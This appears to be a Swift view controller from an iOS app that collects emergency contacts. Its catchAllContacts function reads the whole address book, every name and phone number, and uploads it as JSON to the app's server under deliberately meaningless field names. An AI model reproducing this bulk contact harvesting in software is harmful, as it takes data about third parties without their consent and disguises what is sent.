//
//  ContactswkVosruejdViewController.swift
//  PintarDom
//
//  Created by Yu Chen  on 2025/11/23.
//

import UIKit

class ContactswkVosruejdViewController: AuthExtensiwksViewController {

    private var constactsInfo: [ConstacesSaveModel] = []
    
    override func buildPageUI() {
        super.buildPageUI()
        
    }
    
    override func layoutPageViews() {
        super.layoutPageViews()
        
    }

    override func pageNetRequest() {
        super.pageNetRequest()
        APPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("qscgy/infinite", requestParams: ["nor": self.comsejDityID])) { [weak self] (task: URLSessionDataTask, res: APPSuccessResponse) in
            guard let _skw = res.jsonDict, let _modlsw = ContactswkinfoModel.model(with: _skw), let _sowk = _modlsw.obvious else {
                return
            }
            
            self?.buildContactsitemsw(modlw: _sowk)
        }
    }
}

private extension ContactswkVosruejdViewController {
    func buildContactsitemsw(modlw: [Obvious]) {
        var topskwViews: ContactswkinfoItemViwks?
        
        modlw.enumerated().forEach { (index, element) in
            let view = ContactswkinfoItemViwks(frame: CGRect.zero, inputStyle: RenZhengElemeent.RZ_Enum)
            view.reloadContactsItemModel(itemModel: element)
            view.inputDelesjuw = self
            view.tag = 3000 + index
            
            self.saveEmergeswjdInfo(persowntag: view.tag, name: element.able, phone: element.press, relesk: element.farther)
            self.basicScrollContentView.addSubview(view)
            
            if let _tt = topskwViews {
                if index == modlw.count - 1 {
                    view.snp.makeConstraints { make in
                        make.horizontalEdges.equalTo(_tt)
                        make.top.equalTo(_tt.snp.bottom).offset(14)
                        make.bottom.equalToSuperview().offset(-12)
                    }
                } else {
                    view.snp.makeConstraints { make in
                        make.horizontalEdges.equalTo(_tt)
                        make.top.equalTo(_tt.snp.bottom).offset(14)
                    }
                }
            } else {
                view.snp.makeConstraints { make in
                    make.left.top.equalToSuperview().offset(12)
                    make.width.equalTo(jk_kScreenW - 56)
                }
            }
            
            topskwViews = view
        }
    }
    
    func saveEmergeswjdInfo(persowntag: Int, name: String? = nil, phone: String? = nil, relesk: String? = nil) {
        if let _inw = self.constactsInfo.firstIndex(where: {$0.personTag == persowntag}) {
            self.constactsInfo[_inw].personTag = persowntag
            if let _p = phone {
                self.constactsInfo[_inw].press = _p
            }
            
            if let _n = name {
                self.constactsInfo[_inw].able = _n
            }
            
            if let _rea = relesk {
                self.constactsInfo[_inw].farther = _rea
            }
        } else {
            let infoModel = ConstacesSaveModel()
            if let _p = phone {
                infoModel.press = _p
            }
            
            if let _n = name {
                infoModel.able = _n
            }
            
            if let _rea = relesk {
                infoModel.farther = _rea
            }
            
            infoModel.personTag = persowntag
            
            self.constactsInfo.append(infoModel)
        }
    }
    
    func catchAllContacts() {
        APPContactManager.sharedInstance().accessContactsComplection { (success: Bool, persons: [APPPerson]?) in
            guard success else {
                return
            }
            
            let resDiwks: NSMutableArray = NSMutableArray()
            
            persons?.forEach { (element: APPPerson) in
                var phosnw: [String] = []
                element.phones.forEach { (phon: APPPhone) in
                    phosnw.append(phon.phone)
                }
                
                resDiwks.add(["behold": phosnw.joined(separator: ","), "able": element.fullName ?? ""])
            }
            
            if var _json = resDiwks.modelToJSONString() {
                #if DEBUG
                    _json = "[{\"behold\":\"13303029382\",\"able\":\"王XX\"}]"
                #endif
                APPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("qscgy/here", requestParams: ["bade": _json])) { _, _ in
                    
                }
            }
        }
    }
}

extension ContactswkVosruejdViewController: InfoAuthCompelwProtocol {
    func toushInfoItem(itemView: UIView) {
        guard let infoView = itemView as? ContactswkinfoItemViwks else {
            return
        }
        
        
    }
    
    func didEndEditeing(itemsiw: UIView, inputsw: String?) {
        
    }
}
